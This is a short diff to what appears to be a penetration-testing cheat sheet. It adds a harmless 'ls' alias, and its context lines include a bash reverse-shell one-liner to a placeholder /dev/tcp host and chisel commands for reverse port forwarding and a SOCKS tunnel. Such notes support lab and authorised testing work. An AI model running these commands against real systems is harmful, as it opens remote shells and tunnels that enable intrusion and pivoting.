@@ -1,3 +1,4 @@
+alias ls='ls -a --full-time'
 bash -i >& /dev/tcp/IP/PORT 0>&1
 chisel client IP:PORT R:PORT:IP:PORT
 chisel client IP:PORT R:socks
